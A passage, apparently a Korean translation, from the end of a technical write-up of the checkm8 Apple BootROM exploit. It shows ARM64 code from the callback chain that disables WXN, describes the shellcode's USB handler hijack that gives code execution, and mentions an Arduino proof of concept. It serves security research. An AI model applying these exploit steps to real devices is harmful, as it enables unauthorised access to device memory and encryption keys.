ADD  X2, X1, #0xA0000
ADD  X1, X1, #0x625
STR  X1, [X2,#0x600]
DMB  SY

MOV  X0, #0x100D
MSR  SCTLR_EL1, X0
DSB  SY
ISB

RET
```

RW 메모리에서 코드를 실행할 수 있도록 WXN(Write permission implies Execute-Never)이 비활성화된다. Translation table이 수정되어 이 WXN 비활성화 코드를 실행할 수 있게 되었다.

#### 5.7. write_ttbr0(0x1800A0000)

```
00000001000003E4: MSR #0, c2, c0, #0, X0; [>] TTBR0_EL1
00000001000003E8: ISB
00000001000003EC: RET
```

TTBR0_EL1의 원래 값이 복원된다. INSECURE_MEMORY 데이터가 덮어쓰이므로 가상 주소 변환 중 BootROM이 올바르게 동작해야 한다.

#### 5.8. tlbi

Translation table이 다시 리셋된다.

#### 5.9. exit_critical_section()

인터럽트 핸들링이 정상으로 복귀한다.

#### 5.10. 0x1800B0000

제어가 초기화 셸코드로 이전된다.

따라서 callback 체인의 주요 목적은 **WXN을 비활성화하고 RW 메모리의 셸코드로 제어를 이전**하는 것이다.

### 6. 셸코드 실행

셸코드는 `src/checkm8_arm64.S`에 있으며 다음 단계를 수행한다:

#### 6.1. USB 설정 디스크립터 덮어쓰기

전역 메모리에는 힙의 두 설정 디스크립터(`usb_core_hs_configuration_descriptor`, `usb_core_fs_configuration_descriptor`)에 대한 포인터가 저장된다. 3단계에서 이 디스크립터들이 손상되었다. USB 장치와의 올바른 상호 작용에 필요하므로 셸코드가 이를 복원한다.

#### 6.2. USB 시리얼 번호 변경

시리얼 번호에 `"PWND:[checkm8]"` 부분 문자열이 추가된 새 문자열 디스크립터가 작성된다. 이를 통해 익스플로잇 성공 여부를 확인할 수 있다.

#### 6.3. USB 요청 핸들러 포인터 덮어쓰기

인터페이스의 원래 USB 요청 핸들러 포인터가 새 핸들러의 포인터로 덮어써진다. 새 핸들러는 이후 메모리에 배치된다.

#### 6.4. USB 요청 핸들러를 TRAMPOLINE 메모리 영역으로 복사 (0x1800AFC00)

USB 요청이 수신되면 새 핸들러가 요청의 `wValue`를 `0xffff`와 비교한다. 같지 않으면 원래 핸들러로 제어를 넘기고, 같으면 새 핸들러에서 `memcpy`, `memset`, `exec` 계열 함수 등 다양한 명령을 실행할 수 있다(사실상 PC 제어).

**이로써 익스플로잇 분석이 완료되었다.**

## USB 로우 레벨 익스플로잇 구현

USB 로우 레벨 공격의 보너스 예시로, USB Host Shield를 이용한 Arduino에서의 checkm8 PoC가 공개되었다. PoC는 iPhone 7에서 작동하며 다른 장치로 쉽게 이식 가능하다. DFU 모드의 iPhone 7을 USB Host Shield에 연결하면 이 문서에 설명된 모든 단계가 실행되고 장치가 `PWND:[checkm8]` 모드로 진입한다. 이후 USB로 PC에 연결해 ipwndfu를 사용할 수 있다(메모리 덤프, 암호화 키 접근 등).

이 방법은 USB 컨트롤러와 직접 통신하기 때문에 최소 타임아웃의 비동기 요청을 사용하는 방법보다 더 안정적이다.

![Arduino USB Host Shield PoC](https://habrastorage.org/webt/7o/bx/ni/7obxni6ihhdg8tz0dljedtfmrwy.jpeg)

## 결론

이 취약점은 탈옥 커뮤니티에 계속 영향을 미치고 있다. checkm8 기반의 탈옥인 checkra1n이 이미 개발 중이었으며, 이 취약점은 패치할 수 없으므로 iOS 버전과 관계없이 취약한 칩(A5~A11)에서 항상 동작한다. Apple Watch, Apple TV 등 영향받는 장치도 많다.

탈옥 외에도 이 취약점은 Apple 기기를 연구하는 연구자들에게도 큰 의미가 있다. checkm8으로 이미 iOS 장치를 상세 모드로 부팅하거나, SecureROM을 덤프하거나, GID 키로 펌웨어 이미지를 복호화할 수 있다. 그러나 가장 흥미로운 응용은 특수 JTAG/SWD 케이블을 사용해 취약한 장치에서 디버그 모드로 진입하는 것이다. 이전에는 특수 프로토타입 하드웨어나 전문 서비스의 도움이 있어야만 가능했던 일이다. checkm8은 Apple 하드웨어 연구를 훨씬 쉽고 접근하기 용이하게 만들었다.

## 참고 문헌

1. Jonathan Levin, [*OS Internals: iBoot*](http://newosxbook.com/bonus/iBoot.pdf)
2. Apple, [iOS Security Guide](https://support.apple.com/guide/security/welcome/web)
3. littlelailo, [apollo.txt](https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4)
4. [usb.org](http://usb.org/)
5. [USB in a NutShell](https://www.beyondlogic.org/usbnutshell/usb1.shtml)
6. [ipwndfu](https://github.com/axi0mX/ipwndfu)
7. [ipwndfu fork by LinusHenze](https://github.com/LinusHenze/ipwndfu_public)
